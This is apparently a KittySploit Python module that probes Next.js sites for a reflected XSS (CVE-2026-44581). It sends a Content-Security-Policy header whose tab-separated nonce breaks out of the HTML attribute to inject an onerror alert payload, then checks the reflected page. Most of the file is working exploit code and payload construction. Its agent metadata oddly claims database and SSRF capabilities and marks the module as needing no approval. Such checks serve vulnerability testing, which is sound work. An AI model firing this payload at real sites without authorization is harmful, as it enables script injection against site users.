#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js CSP-nonce reflected XSS (CVE-2026-44581)",
        "description": (
            "GET with Content-Security-Policy: script-src 'nonce-<payload>' where the payload uses a TAB "
            "as separator so the legacy nonce parser accepts it; reflected nonce must not be "
            "attribute-escaped (< 16.2.5). Optional validation_token replaces VALIDATION_TOKEN in PoC."
        ),
        "author": ["KittySploit Team"],
        "cve": "CVE-2026-44581",
        "references": ["https://github.com/advisories/GHSA-ffhc-5mcf-pf4q"],
        "tags": ["http", "nextjs", "xss", "csp", "nonce"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    validation_token = OptString(
        "VALIDATION_TOKEN",
        "String embedded in alert() and in the HTML needle match",
        required=False,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _csp_and_needle(self):
        tok = str(self._o(self.validation_token) or "VALIDATION_TOKEN").strip() or "VALIDATION_TOKEN"
        if "'" in tok or "\n" in tok or "\r" in tok:
            tok = "VALIDATION_TOKEN"
        inner = '"\tonerror="alert(\'' + tok + '\')'
        csp = "script-src 'nonce-" + inner + "'"
        needle = "nonce=\"\" onerror=\"alert('" + tok + "')\""
        return csp, needle

    def _get_with_csp(self):
        url = self._url()
        csp, _ = self._csp_and_needle()
        hdr = {"Content-Security-Policy": csp}
        try:
            r = self.get(url, headers=hdr, timeout=float(self._o(self.timeout)))
            body = r.text
            mode = r.headers.get("X-Server-Mode", "")
            refl = r.headers.get("X-CSP-Nonce-Reflected", "")
            return r.status_code, body, None, csp, mode, refl
        except Exception as e:
            return -1, "", str(e), csp, "", ""
        finally:
            for k in hdr:
                self.session.headers.pop(k, None)

    @staticmethod
    def _classify(body: str, needle: str) -> str:
        if needle in body:
            return "vulnerable"
        if "&quot;" in body:
            return "patched"
        if "nonce=" not in body:
            return "patched"
        return "inconclusive"

    def check(self):
        csp, needle = self._csp_and_needle()
        code, body, err, csp_sent, mode, refl = self._get_with_csp()
        if err:
            return {
                "vulnerable": False,
                "reason": f"GET failed: {err}",
                "confidence": "high",
                "csp": csp_sent,
            }
        if code != 200:
            return {
                "vulnerable": False,
                "reason": f"HTTP {code}",
                "confidence": "medium",
                "csp": csp_sent,
            }
        v = self._classify(body, needle)
        if v == "vulnerable":
            return {
                "vulnerable": True,
                "reason": "nonce attribute breakout (unescaped) in HTML",
                "confidence": "high",
                "csp": csp_sent,
                "headers": {"X-Server-Mode": mode, "X-CSP-Nonce-Reflected": refl},
            }
        if v == "patched":
            return {
                "vulnerable": False,
                "reason": "Escaped (&quot;) or nonce attribute omitted",
                "confidence": "high",
                "csp": csp_sent,
                "headers": {"X-Server-Mode": mode, "X-CSP-Nonce-Reflected": refl},
            }
        return {
            "vulnerable": False,
            "reason": "Nonce present but breakout substring not found",
            "confidence": "low",
            "csp": csp_sent,
            "headers": {"X-Server-Mode": mode, "X-CSP-Nonce-Reflected": refl},
        }

    def run(self) -> bool:
        csp, needle = self._csp_and_needle()
        print_info(f"Target: {self._url()}")
        print_info(f"Content-Security-Policy: {csp}")
        code, body, err, _, mode, refl = self._get_with_csp()
        if err:
            print_error(f"Request failed: {err}")
            return False
        print_status(f"HTTP {code}")
        print_status(f"X-Server-Mode: {mode or '?'}")
        print_status(f"X-CSP-Nonce-Reflected: {refl or '?'}")
        print_status("--- lines with <script or nonce= ---")
        for line in body.splitlines():
            if "<script" in line or "nonce=" in line:
                print_status(line)
        print_status("---")

        v = self._classify(body, needle)
        if v == "vulnerable":
            print_error("Vulnerable — reflected nonce allows attribute breakout (XSS).")
            return True
        if v == "patched":
            print_success("Patched — &quot; escape or strict nonce rejection.")
            return False
        print_warning("Inconclusive — adjust path or token if the app reflects CSP nonce differently.")
        return False
